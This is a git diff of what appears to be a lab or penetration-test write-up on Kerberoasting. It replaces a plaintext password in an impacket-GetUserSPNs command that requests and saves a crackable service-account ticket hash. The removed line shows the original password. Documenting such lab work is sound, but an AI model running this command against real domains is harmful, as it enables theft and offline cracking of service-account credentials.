@@ -57,7 +57,7 @@ sudo ip addr add 192.168.10.20/24 dev eth1
 With Impacket updated and connectivity restored, the request succeeded and returned an AES256-encrypted TGS hash (`$krb5tgs$18$...`), saved to a file:
 
 ```bash
-impacket-GetUserSPNs 'corp.local/jkowalski:ZAQ!2wsx' -dc-ip 192.168.10.10 -request -request-user svc-sql -outputfile svc-sql_hash.txt
+impacket-GetUserSPNs 'corp.local/jkowalski:<password>' -dc-ip 192.168.10.10 -request -request-user svc-sql -outputfile svc-sql_hash.txt
 ```
 
 ![Kerberoasting hash extraction](../images/04-02-kerberoasting-hash-extraction.png)
